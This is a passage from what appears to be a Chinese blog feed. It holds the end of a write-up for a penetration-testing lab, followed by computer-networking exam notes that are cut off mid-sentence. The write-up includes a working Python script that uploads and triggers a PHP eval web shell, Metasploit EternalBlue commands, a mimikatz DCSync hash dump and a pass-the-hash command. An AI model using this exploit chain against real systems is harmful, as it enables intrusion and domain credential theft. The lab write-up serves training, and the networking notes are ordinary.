class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br></pre></td></tr></table></figure><p>运行代码的同目录下应该写一个1.php,内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行脚本后获得文件上传路径</p><p>蚁剑配置socks5代理后连接，得到flag2</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/4.png" alt="4"></p><p>这个一般直接拿kali的msf打永恒之蓝</p><p>给kali配置socks5代理</p><p>vim &#x2F;etc&#x2F;proxychains4.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功正向连接</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/5.png" alt="5"></p><p>mimikatz搜集域内用户hash，再用crackmapexec打PTH拿下域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云镜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>2025.6.19 明天就考试了，怎么办怎么办(慌)</p><p>最基础的知识点了</p><p>往年题<a href="https://xyy9233.github.io/2024/12/16/ji-wang/">https://xyy9233.github.io/2024/12/16/ji-wang/</a>  🥰伟大</p><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><p>通常把与因特网相连的计算机或其他设备称为端系统，端系统也称为主机，主机分为客户和服务器</p><p>接入网是指将端系统物理连接到边缘路由器的网络，边缘路由器是端系统到任何其他远程端系统的路径的第一台路由器</p><ul><li>家庭接入</li><li>企业接入</li><li>广域无线接入</li></ul><p>网络核心：位于网络层级的最顶层，连接多个边缘网络</p><h2 id="分组交换与电路交换"><a href="#分组交换与电路交换" class="headerlink" title="分组交换与电路交换"></a>分组交换与电路交换</h2><table><thead><tr><th align="left"><strong>特性</strong></th><th align="left"><strong>分组交换</strong></th><th align="left"><strong>电路交换</strong></th></tr></thead><tbody><tr><td align="left"><strong>连接类型</strong></td><td align="left"><strong>无连接</strong>（如IP网络）或 <strong>逻辑连接</strong>（如TCP）</td><td align="left"><strong>物理连接</strong>（独占端到端链路）</td></tr><tr><td align="left"><strong>建立过程</strong></td><td align="left">无需预先建立固定路径，数据包独立路由（如快递）</td><td align="left">需预先建立专用通道（如传统电话拨号）</td></tr></tbody></table><p>存储转发传输：在交换机开始向输出链路传输该分组的第一个比特之前，必须接受到整个分组。通过N条速率均为R的链路组成的路径，从源到目的地发送一个分组，d_end&#x3D;NL&#x2F;R</p><p>排队时延：分组交换机对每个相联的链路有一个输出缓存，到达的分组在输出缓存中等待，缓存大小有限，如果缓存满了，会发生丢包</p><p>转发表和路由选择协议</p><p>电路交换：在两台主机之间创建一条专用的端到端连接，链路中的电路通过频分复用或时分复用来实现</p><p>分组交换的性能优于电路交换：分组交换按需分配链路</p><p>例题：分组交换和电路交换支持的用户数</p><blockquote><p>某网络提供商有一个总带宽为 <strong>1 Mbps（1000 Kbps）</strong> 的通信链路。每个用户在通信时需要<strong>恒定的 100 Kbps</strong> 带宽。</p><p>问题：</p><ol><li><strong>电路交换</strong>模式下，最多能同时支持多少个用户？</li><li>若采用<strong>分组交换</strong>，假设每个用户以 10% 的概率在任意时刻发送数据，问该链路最多可以支持多少个用户，使得几乎不会出现拥塞？</li></ol><hr><p> 解答解析：</p><ol><li><strong>电路交换</strong></li></ol><ul><li>每个用户通信时占用 100 Kbps，链路总带宽为 1000 Kbps；</li><li>所以最多能支持的并发用户数为：</li></ul><p>1000&#x2F;100&#x3D;10 个用户</p><p>电路交换需要为每个用户<strong>预留带宽</strong>，即使用户暂时不发送数据也占用资源。</p><hr><ol start="2"><li><strong>分组交换</strong></li></ol><ul><li>每个用户在任意时刻有 10% 的概率发送数据；</li><li>假设有 NNN 个用户，则期望同时活跃的用户数为：</li></ul><p>0.1×N</p><ul><li>为了使链路不会拥塞，活跃用户带宽需求应不超过总带宽：</li></ul><p>0.1×N×100≤1000⇒N≤100</p><p>所以，分组交换在这种统计复用场景下，最多可以支持 <strong>约 100 个用户</strong>，是电路交换的 <strong>10 倍</strong>。</p></blockquote><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>处理时延：检查分组首部和决定分组导向何处和其他因素比如检查比特级别的差错，微秒或更低数量级</p><p>排队时延：分组在链路上等待传输</p><p>传输时延：先到先服务方式，L表示该分组的长度，R表示从路由器A到路由器B的传输速率，L&#x2F;R</p><p>传播时延：传播速率取决于物理媒介，传播时延&#x3D;两台路由器的距离除以传播速率，d&#x2F;s</p><p>排队时延和丢包：令a表示分组到达队列的平均速率，则比特到达队列的平均速率为La bps,La&#x2F;R称为流量强度，设计系统时流量强度不能大于1</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>HTTP 服务器采用无状态(stateless)管理方式，不保存客户端的任何状态信息。为了能记录用户状态，需要使用cookies</p><p>Web Cache（网页缓存）的作用是在客户端或中间网络节点保存之前获取过的 Web 资源副本，以减少后续访问相同资源时的响应延迟、带宽消耗和服务器负载。这是 Web 性能优化中非常关键的一环。</p><h2 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h2><p>动态主机配置协议，自动为设备分配 IP 地址及网络参数，它使用UDP传输，属于应用层</p><p>使用端口：UDP 67（服务器端）、UDP 68（客户端）</p><p>工作流程</p><table><thead><tr><th>步骤</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>①</td><td><strong>Discover</strong></td><td>客户端广播发送 DHCP Discover，寻找 DHCP 服务器，源ip为0.0.0.0，目的ip为255.255.255.255</td></tr><tr><td>②</td><td><strong>Offer</strong></td><td>服务器回应 DHCP Offer，提供一个 IP 地址等参数，源ip为dhcp服务器ip,目的ip为255.255.255.255</td></tr><tr><td>③</td><td><strong>Request</strong></td><td>客户端广播发送 DHCP Request，请求使用该 IP 地址，源ip为0.0.0.0，目的ip为255.255.255.255</td></tr><tr><td>④</td><td><strong>ACK</strong></td><td>服务器发送 DHCP ACK，确认配置，租约开始，源ip为dhcp服务器ip,目的ip为255.255.255.255</td></tr></tbody></table><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.png" alt="image-20250617214644098"></p><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>将域名转换为IP地址</p><p><strong>本地 DNS 递归查询过程如下：</strong></p><ol><li>问根服务器（Root DNS）</li></ol><ul><li>问：“.com 域在哪？”</li><li>根服务器返回：你去找 .com 顶级域（TLD）服务器</li></ul><ol start="2"><li>问 .com 顶级域服务器</li></ol><ul><li>问：“example.com 在哪？”</li><li>返回：去找 example.com 的权威 DNS 服务器</li></ul><ol start="3"><li>问权威 DNS 服务器</li></ol><ul><li>问：“<a href="http://www.example.com/">www.example.com</a> 的 IP 是多少？”</li><li>返回最终答案：例如 <code>93.184.216.34</code></li></ul><ol start="4"><li>本地 DNS 把结果返回给客户端</li></ol><ul><li>同时会将查询结果 缓存一段时间（根据 TTL），避免重复查询。</li></ul><ol start="5"><li>浏览器用 IP 发起 HTTP 请求</li></ol><h2 id="SMTP协议（了解）"><a href="#SMTP协议（了解）" class="headerlink" title="SMTP协议（了解）"></a>SMTP协议（了解）</h2><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.png" alt="image-20250617220521682"></p><p>邮件发送协议SMTP，邮件读取协议POP3</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.png" alt="image-20250617220714950"></p><h2 id="服务模型"><a href="#服务模型" class="headerlink" title="服务模型"></a>服务模型</h2><ul><li>CS 客户端-服务器</li><li>P2P 对等</li><li>混合</li></ul><p>CS和P2P比较</p><table><thead><tr><th>对比维度</th><th><strong>CS（Client-Server）</strong></th><th><strong>P2P（Peer-to-Peer）</strong></th></tr></thead><tbody><tr><td><strong>中心节点</strong></td><td>有中心服务器</td><td>无中心，或仅有“协调服务器”</td></tr><tr><td><strong>节点角色</strong></td><td>客户端请求、服务器响应</td><td>节点既是客户端又是服务器</td></tr><tr><td><strong>通信方式</strong></td><td>客户端 ↔ 服务器</td><td>节点 ↔ 节点（点对点）</td></tr><tr><td><strong>可扩展性</strong></td><td>差，服务器是瓶颈</td><td>好，越多人越快（比如 BitTorrent）</td></tr><tr><td><strong>稳定性</strong></td><td>高，服务器在线即可提供服务</td><td>依赖各节点，易受节点下线影响</td></tr><tr><td><strong>资源管理</strong></td><td>集中管理</td><td>分布式管理</td></tr><tr><td><strong>维护成本</strong></td><td>高（需要维护服务器）</td><td>低（资源由用户节点维护）</td></tr><tr><td><strong>常见应用</strong></td><td>网站、银行系统、邮箱、Web 服务等</td><td>BT 下载、电驴、电信 IPTV、区块链、IPFS 等</td></tr></tbody></table><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619215426535.png" alt="image-20250619215426535"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619215452820.png" alt="image-20250619215452820"></p><h2 id="持久性HTTP和非持久性HTTP"><a href="#持久性HTTP和非持久性HTTP" class="headerlink" title="持久性HTTP和非持久性HTTP"></a>持久性HTTP和非持久性HTTP</h2><table><thead><tr><th>特性</th><th>非持久性 HTTP（Non-persistent）</th><th>持久性 HTTP（Persistent）</th></tr></thead><tbody><tr><td><strong>连接方式</strong></td><td>每个请求-响应对使用一个 TCP 连接</td><td>多个请求-响应共享一个 TCP 连接</td></tr><tr><td><strong>TCP 连接次数</strong></td><td>多次建立和关闭连接（开销大）</td><td>建立一次连接后复用（效率高）</td></tr><tr><td><strong>延迟表现</strong></td><td>更高的延迟，慢</td><td>延迟更低，快</td></tr><tr><td><strong>使用情况</strong></td><td>HTTP&#x2F;1.0 默认</td><td>HTTP&#x2F;1.1 默认启用（可禁用）</td></tr></tbody></table><p>$$<br>T_{\text{non-persistent}} &#x3D; n \times (2 \cdot RTT + \frac{F}{R})<br>$$</p><p>$$<br>T_{\text{persistent}} &#x3D; 2 \cdot RTT + n \cdot \frac{F}{R}<br>$$</p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="TCP和UDP的区别"><a href="#TCP和UDP的区别" class="headerlink" title="TCP和UDP的区别"></a>TCP和UDP的区别</h2><table><thead><tr><th>对比项</th><th><strong>TCP</strong></th><th><strong>UDP</strong></th></tr></thead><tbody><tr><td><strong>全称</strong></td><td>Transmission Control Protocol（传输控制协议）</td><td>User Datagram Protocol（用户数据报协议）</td></tr><tr><td><strong>是否面向连接</strong></td><td>✅ 是（需要三次握手建立连接）</td><td>❌ 否（无连接，直接发送）</td></tr><tr><td><strong>可靠性</strong></td><td>✅ 可靠传输，确保无丢包、无重复、按序到达</td><td>❌ 不可靠，可能丢包、不按序、不重传</td></tr><tr><td><strong>传输方式</strong></td><td>字节流（Stream）</td><td>数据报（Datagram）</td></tr><tr><td><strong>拥塞控制</strong></td><td>✅ 有（如 TCP Reno, CUBIC 等）</td><td>❌ 没有</td></tr><tr><td><strong>流量控制</strong></td><td>✅ 有（滑动窗口机制）</td><td>❌ 没有</td></tr><tr><td><strong>首部开销</strong></td><td>较大，20 字节起</td><td>较小，8 字节</td></tr><tr><td><strong>速度</strong></td><td>较慢（有确认、重传等机制）</td><td>快（直接发，不管结果）</td></tr><tr><td><strong>典型应用</strong></td><td>HTTP、HTTPS、FTP、SMTP、SSH 等</td><td>DNS、视频直播、VoIP、在线游戏等</td></tr></tbody></table><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p>checksum校验和</p><p>1.构造伪首部，虽然不在 UDP 报文中，但参与校验和计算</p><p>2.如果总长度不是 16 位的整数倍，补一个 0 字节再计算</p><p>3.按16位分组相加，产生溢出要加到低位</p><p>4.取反码</p><h2 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h2><p>三次握手</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619204108474.png" alt="image-20250619204108474"></p><p>四次挥手</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619204139638.png" alt="image-20250619204139638"></p><h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><p>AIMD自适应指数衰减法</p><p>TCP CUBIC 改进AIMD，丢包后窗口大小减半，最初更快的增长，随后以更慢的速度达到最大窗口值</p><p>![屏幕截图 2025-06-15 150137](屏幕截图 2025-06-15 150137.png)</p><p>TCP reno</p><p>![屏幕截图 2025-06-14 170733](屏幕截图 2025-06-14 170733.png)</p><p>慢启动阶段：初始时cwnd&#x3D;1 MSS,每一个轮次cwnd大小加倍，指数级增长</p><p>拥塞避免阶段：每一个轮次cwnd加1，线性增长</p><p>快重传：</p><ul><li><p>超时：这是严重的拥塞，说明连续多个数据包都没有被确认。</p><p>将拥塞窗口 cwnd 重置为 1 MSS，ssthresh（慢开始门限）设为原 cwnd 的一半，重新进入 慢开始阶段</p></li><li><p>收到三次重复ACK：说明某个包丢了，但之后的包被收到了。</p><p>快速重传丢失的数据包（无需等待超时），ssthresh &#x3D; cwnd &#x2F; 2</p><p>cwnd &#x3D; ssthresh + 3 × MSS（考虑已经收到 3 个冗余 ACK）</p><p>进入快速恢复（Fast Recovery）阶段，在收到新的 ACK 后，恢复到拥塞避免（Congestion Avoidance）阶段</p></li></ul><p>快速恢复：</p><p>每收到一个重复的ACK，cwnd加1</p><p>收到一个新的ACK，将 cwnd 恢复为 ssthresh，退出快速恢复，进入拥塞避免阶段</p><p>newreno：改进了快速恢复算法。在Reno中发送方只要收到一个新的ACK就会进入拥塞避免阶段，在New Reno中只有所有丢失的包都重传并收到确认后才退出</p><p>MTU:数据链路层中一个数据帧最大能承载的字节数，一般为1500bytes</p><p>MSS:TCP协议中一个TCP报文中应用层数据的最大长度，MSS&#x3D;MTU-IP头部-TCP头部&#x3D;1460bytes</p><h2 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a>TCP流量控制</h2><p>基于滑动窗口协议，为了匹配发送方的发送速率和接收方的读取速率</p><p>传输层和数据链路层流量控制的区别：传输层定义端到端用户之间的流量控制，数据链路层定义两个相邻节点的流量控制。数据链路层的滑动窗口大小是固定的，而传输层的可以动态变化</p><p>停等协议</p><p>相当于发送窗口大小&#x3D;1，接收窗口大小&#x3D;1</p><p>滑动窗口协议</p><table><thead><tr><th>协议</th><th>特点</th><th>丢包&#x2F;出错时</th><th>适用于</th></tr></thead><tbody><tr><td><strong>GBN（Go-Back-N）</strong></td><td>接收方只接收按序号到达的分组，只发送<strong>累计确认 ACK</strong></td><td>丢一个，后面全部重传</td><td>逻辑简单、吞吐低</td></tr><tr><td><strong>SR（Selective Repeat）</strong></td><td>接收方可接受乱序分组，每个分组独立确认</td><td>只重传出错&#x2F;丢失的那一个</td><td>更复杂、吞吐高</td></tr></tbody></table><p>利用率</p><p>![屏幕截图 2025-06-17 113459](屏幕截图 2025-06-17 113459.png)</p><p>![屏幕截图 2025-06-17 113515](屏幕截图 2025-06-17 113515.png)</p><h2 id="rdt"><a href="#rdt" class="headerlink" title="rdt"></a>rdt</h2><p>可靠数据传输协议，它通常作为一种教学模型出现，用来帮助理解实际网络协议（如 TCP）是如何解决数据丢失、重复、乱序等问题的。</p><h3 id="rdt1-0"><a href="#rdt1-0" class="headerlink" title="rdt1.0"></a>rdt1.0</h3><p>可靠信道，无差错，不丢包，最简单</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.png" alt="4"></p><h3 id="rdt2-0"><a href="#rdt2-0" class="headerlink" title="rdt2.0"></a>rdt2.0</h3><p>信道可能出错，使用 确认ACK &#x2F; 负确认NAK + 校验位</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.png" alt="image-20250619161214580"></p><h3 id="rdt2-1"><a href="#rdt2-1" class="headerlink" title="rdt2.1"></a>rdt2.1</h3><p>增加了 序号来防止 ACK &#x2F; NAK 混淆</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161445314.png" alt="image-20250619161445314"></p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161546120.png" alt="image-20250619161546120"></p><h3 id="rdt2-2"><a href="#rdt2-2" class="headerlink" title="rdt2.2"></a>rdt2.2</h3><p>使用 ACK + 序号（无 NAK）</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161651943.png" alt="image-20250619161651943"></p><h3 id="rdt3-0"><a href="#rdt3-0" class="headerlink" title="rdt3.0"></a>rdt3.0</h3><p>处理信道可能丢包的问题，增加超时重传机制，相当于停等协议</p><p>sender:</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619161841028.png" alt="image-20250619161841028"></p><h2 id="TCP的往返时延超时机制"><a href="#TCP的往返时延超时机制" class="headerlink" title="TCP的往返时延超时机制"></a>TCP的往返时延超时机制</h2><p>EstimatedRTT &#x3D; (1 - α) * EstimatedRTT + α * SampleRTT</p><p>这是一个加权平均公式，用于估计 RTT（即从一个数据包发送到收到确认的时间）</p><p>指数加权平均移动，α典型值为0.125</p><p>优点：</p><p>对最近的样本更敏感，响应网络变化；</p><p>对过去的样本仍保留一定影响，从而避免波动太大；</p><p>可以平滑 RTT 的估计值，提高 TCP 超时机制的稳定性。</p><p>DevRTT 表示 RTT 的平均偏差，是对 RTT 波动情况的一种估计。若网络中 RTT 波动很大，DevRTT 也会较大；反之，如果 SampleRTT 很稳定，DevRTT 就会较小。</p><p>DevRTT&#x3D;(1−β)⋅DevRTT+β⋅∣SampleRTT−EstimatedRTT∣</p><p>β典型值为0.25</p><p> TCP 的超时重传时间TimeoutInterval&#x3D;EstimatedRTT+4⋅DevRTT</p><p>这是为了应对 RTT 的波动——容忍范围扩大 4 倍，以减少不必要的重传。</p><p>若 RTT 非常不稳定，DevRTT 会变大，TimeoutInterval 就会自动增加；</p><p>若 RTT 非常平稳，TimeoutInterval 会相应减小，提高效率。</p><h2 id="TCP-fairness"><a href="#TCP-fairness" class="headerlink" title="TCP fairness"></a>TCP fairness</h2><p>当多个 TCP 流共享同一瓶颈链路时，每个流都能获得大致相同的吞吐量，不会有某个流“独占”资源而饿死其他流。</p><p>为什么会有fairness?</p><p>因为 TCP 的拥塞控制机制天然具有“自适应”行为，它能根据网络反馈（如丢包）来控制自己的发送速率。</p><p>这让多个 TCP 连接在共享链路时，相互协调、退让，从而实现公平。</p><p><img src="/2025/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20250619203838656.png" alt="image-20250619203838656"></p><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务</p><p>路由器的两个功能：路由和转发</p><p>数据平面和控制平面，转发是数据平面的功能，路由选择是控制平面的功能</p><h2 id="SDN"><a href="#SDN" class="headerlink" title="SDN"></a>SDN</h2><p>一种网络架构，集中式的控制平面和分布式的数据平面，两个平面相互分离。</p><p>远程主机为每个分组计算出最佳路由，通过openflow协议将转发表（流表）下发给路由器</p><p>网络发生了拥塞的根据是随着通信子网负载的增加，吞吐量反而降低</p><p>存储转发机制：路由器在开始向输出链路传输第一个分组之前，必须接受到整个分组</p><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息，ping命令</p><h2 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h2><p>静态路由：管理员手工配置</p><p>动态路由：</p><ul><li>距离-向量路由算法：所有结点定期将它们的路由表转发给所有相邻的结点，然后更新路由表，RIP算法</li><li>链路状态路由算法：向本自治系统的所有路由器发送信息，使用泛洪法，发送的信息是与路由器相邻的所有路由器的链路状态，只有当链路状态发生变化时路由器才发送消息，OSPF算法</li></ul><p>层次路由：对于大规模的网络，因特网将整个互联网分为许多较小的自治系统，自治系统内部决定用哪种路由协议</p><p>内部网关协议(IGP):RIP,OSPF</p><p>外部网关协议(EGP):BGP</p><h2 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h2><p>快学</p><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT 是一种由路由器实施的技术，用于将私有 IP 地址（内网地址）转换为公有 IP 地址（公网地址），从而实现内网主机访问互联网或外网访问内网服务。</p><p>工作方式：</p><p>以 <strong>内网主机访问外网</strong> 为例（最常见）：</p><ol><li>内网主机发送请求（如访问 <a href="http://www.baidu.com),源/">www.baidu.com），源</a> IP 是私有 IP（如 192.168.1.100）；</li><li>路由器收到后，使用 NAT 把源 IP 转换为自己的公网 IP（如 101.1.2.3），并记录转换关系；</li><li>数据包发送到公网；</li><li>响应返回时，路由器根据记录，将目标 IP（公网 IP）重新转换为 192.168.1.100，转发给内网主机。</li></ol><h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><p>帧定界帧同步和透明传输</p><p>流量控制(传输层也有)</p><p>差错控制：</p><ul><li>检错码：奇偶校验码，CRC循环冗余校验码</li><li>纠错码：海明码（好复杂）</li></ul><h2 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h2><p>信道划分介质访问控制：</p><ul><li>频分</li><li>时分</li><li>波分</li><li>码分</li></ul><p>随机访问介质访问控制：</p><ul><li>ALOHA协议</li><li>CSMA</li><li>CSMA&#x2F;CD(有线局域网) 支持半双工方式</li><li>CSMA&#x2F;CA(无线局域网)</li></ul><p>ALOHA：<a href="https://blog.csdn.net/shulianghan/article/details/108095501">https://blog.csdn.net/shulianghan/article/details/108095501</a><br>CSMA：</p><ol><li><strong>监听信道（Carrier Sense）</strong>：<ul><li>发送方在发送数据前先监听信道是否正在被占用。</li></ul></li><li><strong>信道空闲（Idle）</strong>：<ul><li>若信道空闲，立即开始发送数据。</li></ul></li><li><strong>信道繁忙（Busy）</strong>：<ul><li>若信道被占用，则等待一段时间后重新监听。</li></ul></li><li><strong>可能冲突（Collision）</strong>：<ul><li>由于传播延迟等原因，两个节点可能会“几乎同时”判断信道空闲并发送，导致冲突。</li></ul></li><li><strong>冲突检测&#x2F;避免（取决于具体变体）</strong></li></ol><table><thead><tr><th>协议名</th><th>中文名</th><th>说明</th></tr></thead><tbody><tr><td><strong>1. 纯 CSMA</strong></td><td>无碰撞检测或避免机制</td><td>听到空闲就发，不考虑冲突。</td></tr><tr><td><strong>2. 1-坚持 CSMA</strong></td><td>1-persistent CSMA</td><td>如果信道空闲立即发送，若忙就持续监听直到空闲立即发送（易冲突）。</td></tr><tr><td><strong>3. 非坚持 CSMA</strong></td><td>Non-persistent CSMA</td><td>如果信道忙，等待随机时间再监听（降低冲突概率，但效率低）。</td></tr><tr><td><strong>4. p-坚持 CSMA</strong></td><td>p-persistent CSMA（用于时隙系统）</td><td>若空闲以概率 p 发送，否则延迟一个时隙再尝试。</td></tr><tr><td><strong>5. CSMA&#x2F;CD</strong></td><td>冲突检测（Ethernet）</td><td>发送时监听是否有冲突，若有冲突立即停止发送（不能用于无线）。</td></tr><tr><td><strong>6. CSMA&#x2F;CA</strong></td><td>冲突避免（Wi-Fi）</td><td>在发送前先等待一段时间（DIFS），再进行竞争避免（不能检测冲突）。</td></tr></tbody></table><p>![屏幕截图 2025-06-19 115659](屏幕截图 2025-06-19 115659.png)</p><p>隐蔽站问题：</p><p>A 和 C 都能和 B 通信，但 A 和 C 互相“听不到”（不在彼此的无线信号覆盖范围）</p><p>用RTS和CTS解决隐蔽站问题</p><p>A 想发送数据给 B，先发送一个 RTS（请求发送）帧；</p><p>B 收到 RTS 后，若信道空闲，就返回一个 CTS（允许发送）帧；</p><p>所有能听到 CTS 的节点（比如 C）会知道 B 将接收数据，于是保持沉默（不发数据）；</p><p>A 收到 CTS 后再正式发送数据；</p><p>完成后 B 回复 ACK 确认。</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，ip地址映射到MAC地址，每台主机都有ARP表</p><p>ARP的工作原理：</p><p><strong>主机 A 检查自己的 ARP 缓存表</strong>：</p><ul><li>看有没有 192.168.1.2 对应的 MAC 地址。</li><li>如果有，直接使用；</li><li>如果没有，继续下一步。</li></ul><p><strong>主机 A 发起 ARP 请求广播</strong>：</p><ul><li>目标 IP：192.168.1.2</li><li>ARP 请求数据包封装在以太网帧中，目的 MAC 地址是广播地址 